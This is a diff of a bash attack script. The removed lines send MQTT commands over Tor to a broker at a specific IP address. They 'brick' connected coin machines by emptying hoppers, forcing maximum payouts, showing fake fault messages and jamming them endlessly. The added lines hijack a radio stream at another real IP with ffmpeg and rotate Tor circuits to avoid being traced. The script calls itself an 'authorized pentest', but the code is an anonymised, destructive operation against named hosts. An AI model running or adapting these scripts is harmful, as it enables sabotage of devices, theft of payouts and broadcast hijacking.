@@ -1,16 +1,32 @@
-torsocks mosquitto_sub -h 188.14.144.138 -p 1883 -t '#' -v -C 30 | grep -oE '([893][0-9a-f]{19})' | sort -u | while read MAC; do
-  echo "BRICKING $MAC";
+#!/bin/bash
+# fm_hijack_tor_minimal.sh - One-Shot Tor-Rotating ICY Hijack (Authorized Pentest)
+# ./fm_hijack_tor_minimal.sh http://your-stream.mp3
+
+TARGET="185.33.21.170:10000"
+URL="$1"
+[ -z "$URL" ] && { echo "Usage: $0 http://your-mp3.mp3"; exit 1; }
+
+torsocks bash -c "
+  # Circuit 1 - Test
+  torify curl -s 'http://$TARGET/' | head -5
   
-  # PROVEN WORKING (copia dal tuo log):
-  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m '{"credits":0,"drop":"MAXIMUM","hopper":"EMPTY"}';
-  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/k/$MAC" -m '{"payout":"MAX","eject":true}';
-  torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/display/$MAC" -m '{"display":"HARDWARE FAULT","neon":1,"permanent":true}';
+  # Rotate + Hijack
+  echo 'AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT' | nc 127.0.0.1 9051 2>/dev/null
+  sleep 3
   
-  # 75x HOPPER DESTRUCTION CYCLES
-  for i in {1..75}; do
-    torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m "{\"drop\":\"MAX\",\"coins\":99999999,\"cycle\":$i}";
-  done;
+  ffmpeg -y -v quiet -stream_loop -1 -re -i '$URL' -c:a libmp3lame -b:a 192k \
+    -f mp3 -headers 'ICY 1.0
+icy-name:HIJACK_$(date +%s)
+icy-description:AUTHORIZED_PENTEST
+icy-url:pentest.local
+icy-br:192
+' tcp://$TARGET &
   
-  # INFINITE JAM
-  while true; do torsocks mosquitto_pub -h 188.14.144.138 -p 1883 -t "m/o/$MAC" -m '{}'; done &
-done &
+  # Auto-rotate 10x (60s each)
+  for i in {1..10}; do
+    sleep 60
+    echo 'AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT' | nc 127.0.0.1 9051 2>/dev/null
+    sleep 3
+    torify curl -s 'http://$TARGET/' | grep -i hijack || echo 'Reconnect...'
+  done
+"
